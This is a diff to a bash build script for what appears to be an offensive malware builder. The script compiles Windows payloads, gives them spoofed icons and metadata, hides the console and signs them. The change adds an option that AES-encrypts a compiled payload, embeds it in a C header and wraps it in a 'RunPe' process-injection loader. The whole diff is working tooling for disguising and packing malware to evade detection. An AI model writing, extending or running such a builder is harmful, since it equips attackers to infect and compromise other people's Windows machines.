@@ -28,7 +28,7 @@ show_help() {
   echo -e "  --type <name>      Required. Spoof type (must match files in icons/ and metadata/)"
   echo -e "  --output <name>    Optional. Output binary name (default: <type>.exe)"
   echo -e "  --hidden           Optional. Hide console window (adds -mwindows)"
-  echo -e "  --aes              Optional. Include aes.c during compilation"
+  echo -e "  --aes              Optional. Encrypt payload using AES and compile it as a process injector (RunPe injection)"
   echo -e "  --add-file <file>  Optional. Add extra source file to compile"
   echo -e "  --list             Show available spoof types"
   echo -e "  -h, --help         Show this help message"
@@ -49,7 +49,7 @@ list_spoofers() {
 
 check_dependencies() {
   MISSING=false
-  for pkg in mingw-w64 binutils-mingw-w64; do
+  for pkg in mingw-w64 binutils-mingw-w64 xxd; do
     if ! dpkg -s "$pkg" &>/dev/null; then
       echo -e "${YELLOW}${PREFIX} Installing missing package: ${WHITE}${pkg}${NC}"
       if ! apt-get install -y "$pkg" &>/dev/null; then
@@ -192,12 +192,45 @@ fi
 CMD=("$COMPILER" "$SOURCE_FILE" "$RES_PATH")
 
 if $USE_AES; then
-  if [[ -f "/bin/aes.c" ]]; then
-    CMD+=("/bin/aes.c")
-  else
-    echo -e "${RED}${PREFIX} AES option was requested but /bin/aes.c is missing.${NC}"
+  AES_DIR="bin/aes"
+  LOADER_C="$AES_DIR/loaders/${TYPE}_loader.c"
+  if [[ ! -f "$LOADER_C" ]]; then
+    echo -e "${RED}${PREFIX} AES loader '$LOADER_C' not found.${NC}"
     exit 1
   fi
+  AES_C="$AES_DIR/aes.c"
+  AES_H="$AES_DIR/aes.h"
+  ENC_BIN="payload.enc"
+
+  if [[ ! -f "$AES_C" || ! -f "$AES_H" || ! -f "$AES_DIR/aes_encryption.py" ]]; then
+    echo -e "${RED}${PREFIX} AES files are missing in $AES_DIR.${NC}"
+    exit 1
+  fi
+
+  echo -e "${BLUE}${PREFIX} Compiling raw payload before encryption...${NC}"
+  RAW_PAYLOAD="/tmp/raw_payload.exe"
+
+  RAW_LINK=""
+  if grep -qi "WSA\|winsock" "$SOURCE_FILE"; then
+    RAW_LINK="-lws2_32"
+  fi
+
+  x86_64-w64-mingw32-gcc "$SOURCE_FILE" -o "$RAW_PAYLOAD" $RAW_LINK || {
+    echo -e "${RED}${PREFIX} Failed to compile raw payload.${NC}"
+    exit 1
+  }
+
+  echo -e "${BLUE}${PREFIX} Encrypting payload with AES...${NC}"
+  python3 "$AES_DIR/aes_encryption.py" "$RAW_PAYLOAD" "$ENC_BIN" || {
+    echo -e "${RED}${PREFIX} AES encryption failed.${NC}"
+    exit 1
+  }
+  echo -e "${BLUE}${PREFIX} Embedding encrypted payload into C header...${NC}"
+  xxd -i "$ENC_BIN" > "$AES_DIR/payload_data.h"
+
+  SOURCE_FILE="$LOADER_C"
+  CMD=("$COMPILER" "$SOURCE_FILE" "$AES_C" "$RES_PATH" -I. -Ibin/aes)
+  [[ "$(realpath "$ENC_BIN")" != "$(realpath ./payload.enc)" ]] && cp "$ENC_BIN" .
 fi
 
 for file in "${EXTRA_FILES[@]}"; do
@@ -223,6 +256,10 @@ if "${CMD[@]}"; then
   echo -e "${GREEN}${PREFIX} Compilation successful: ${WHITE}${OUTPUT}${NC}"
   if $SIGN_PAYLOAD; then
     sign_payload
+  fi
+  if $USE_AES; then
+    echo -e "${BLUE}${PREFIX} Cleaning temporary AES files...${NC}"
+    rm -f payload.enc key_iv.h /tmp/raw_payload.exe
   fi
 else
   echo -e "${RED}${PREFIX} Compilation failed.${NC}"
